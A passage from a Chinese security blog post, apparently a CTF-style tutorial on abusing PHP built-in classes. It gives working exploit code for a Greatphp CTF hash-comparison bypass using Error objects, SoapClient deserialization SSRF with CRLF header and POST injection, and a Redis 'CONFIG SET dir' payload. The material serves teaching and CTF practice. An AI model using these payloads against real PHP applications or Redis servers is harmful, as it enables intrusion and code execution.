class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>绕过<code>md5()</code>和<code>sha1()</code>：</li>
+</ol>
+<p><strong><code>md5()</code>和<code>sha1()</code>可以对一个类进行<code>hash</code>并触发这个类的<code>__toString</code>方法，当<code>eval()</code>函数的参数是一个类对象时，也会触发这个类的<code>__toString()</code>方法。</strong></p>
+<p>所以我们可以使用含有<code>__toString</code>方法的PHP内置类来绕过，用的两个比较多的内置类就是<code>Exception</code>和<code>Error</code>，他们之中有一个<code>__toString</code>方法，当类被当做字符串处理时，就会调用这个函数。</p>
+<ol start="2">
+<li>构造payload：</li>
+</ol>
+<p>过滤了小括号无法调用函数，这里利用<code>include &quot;/flag&quot;</code>将flag文件包含进来即可。由于又过滤了双引号，可以对<code>&quot;/flag&quot;</code>利用取反绕过，因为有不可见字符所以再<code>url</code>一下更好。</p>
+<p>对于Error和Exception类的__toString方法将错误信息转换成字符串payload后，进入eval()函数会类似于：<code>eval(&quot;...Error: payload&quot;)</code>。所以我们要用<code>?&gt;</code>来闭合一下，即 <code>eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)</code>，这样我们的payload便能顺利执行了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>POC如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;syc=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">1</span>);<span class="variable">$a</span>-&gt;lover=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235075.png" alt="image-20250123194029905"></p>
+<h1 id="使用SoapClient类进行SSRF"><a href="#使用SoapClient类进行SSRF" class="headerlink" title="使用SoapClient类进行SSRF"></a>使用SoapClient类进行SSRF</h1><h2 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a>漏洞利用演示</h2><p>构造SSRF利用的exp：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.130.7:2333/&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;Ming&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line"><span class="comment">#O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:4:&quot;Ming&quot;;s:8:&quot;location&quot;;s:26:&quot;http://192.168.130.7:2333/&quot;;s:15:&quot;_stream_context&quot;;i:0;s:13:&quot;_soap_version&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>触发漏洞：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:4:&quot;Ming&quot;;s:8:&quot;location&quot;;s:26:&quot;http://192.168.130.7:2333/&quot;;s:15:&quot;_stream_context&quot;;i:0;s:13:&quot;_soap_version&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">c</span>();   <span class="comment">#调用SoapClient中没有的方法，触发SoapClient类的__call</span></span><br></pre></td></tr></table></figure>
+
+<p>在192.168.130.7上面监听，然后运行上面代码，成功触发SSRF，192.168.130.7上面收到了请求信息。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235464.png" alt="image-20250128013521279" style="zoom:50%;" />
+
+<h2 id="结合CRLF注入利用"><a href="#结合CRLF注入利用" class="headerlink" title="结合CRLF注入利用"></a>结合CRLF注入利用</h2><p><strong>在User_Agent头部注入</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://192.168.130.7:2333/&quot;</span>;</span><br><span class="line"><span class="variable">$agent</span> = <span class="string">&quot;OneBrowser\r\nCookie: PHPSESSID=5799&quot;</span>;</span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;Ming&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$location</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$agent</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="variable">$uri</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>)-&gt;<span class="title function_ invoke__">c</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235645.png" alt="image-20250128204822975"></p>
+<p><strong>发送POST数据包</strong></p>
+<p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。</p>
+<p>对于如何发送POST的数据包，这里面还有一个坑，就是<code>Content-Type</code>的设置，因为我们要提交的是POST数据，所以Content-Type的值我们要设置为<code>application/x-www-form-urlencoded</code>，这里如何修改Content-Type的值呢？由于Content-Type在<code>User-Agent</code>的下面，所以我们可以通过<code>SoapClient</code>来设置User-Agent，将原来的Content-Type挤下去，从而再插入一个新的Content-Type。</p>
+<p>exp如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$location</span> = <span class="string">&#x27;http://192.168.130.7:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$agent</span> = <span class="string">&#x27;WHOAMI^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>;</span><br><span class="line"><span class="variable">$user_agent</span> = <span class="variable">$agent</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$location</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$user_agent</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>)-&gt;<span class="title function_ invoke__">c</span>();</span><br></pre></td></tr></table></figure>
+
+<p>查看监听到的数据，成功注入POST包：</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235083.png" alt="image-20250128221510051"></p>
+<h2 id="与Redis结合"><a href="#与Redis结合" class="headerlink" title="与Redis结合"></a>与Redis结合</h2><p>可以再结合通过HTTP协议去攻击Redis来利用，exp如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&#x27;http://192.168.130.7:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$location</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$payload</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8792#toc-0">https://xz.aliyun.com/news/8792#toc-0</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="prev" title="裸文件包含">
+      <i class="fa fa-chevron-left"></i> 裸文件包含
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/%E6%97%A0%E5%9B%9E%E6%98%BERCE/" rel="next" title="无回显RCE">
+      无回显RCE <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E4%B8%AD%E7%9A%84%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="nav-number">1.</span> <span class="nav-text">php中的内置类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Error%E7%B1%BB"><span class="nav-number">1.1.</span> <span class="nav-text">Error类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#toString%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.1.</span> <span class="nav-text">__toString方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SoapClient%E7%B1%BB"><span class="nav-number">1.2.</span> <span class="nav-text">SoapClient类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#call%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">__call方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Error-Exception%E7%B1%BB%E8%BF%9B%E8%A1%8CXSS"><span class="nav-number">2.</span> <span class="nav-text">使用Error&#x2F;Exception类进行XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E6%BC%94%E7%A4%BA"><span class="nav-number">2.1.</span> <span class="nav-text">xss演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89"><span class="nav-number">2.2.</span> <span class="nav-text">[BJDCTF 2nd]xss之光</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E7%9A%84payload%E6%9E%84%E9%80%A0"><span class="nav-number">2.2.1.</span> <span class="nav-text">xss的payload构造</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Error-Exception%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="nav-number">3.</span> <span class="nav-text">使用Error&#x2F;Exception类绕过哈希比较</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp"><span class="nav-number">3.2.</span> <span class="nav-text">[极客大挑战 2020]Greatphp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF"><span class="nav-number">4.</span> <span class="nav-text">使用SoapClient类进行SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%BC%94%E7%A4%BA"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞利用演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E5%90%88CRLF%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-number">4.2.</span> <span class="nav-text">结合CRLF注入利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8ERedis%E7%BB%93%E5%90%88"><span class="nav-number">4.3.</span> <span class="nav-text">与Redis结合</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
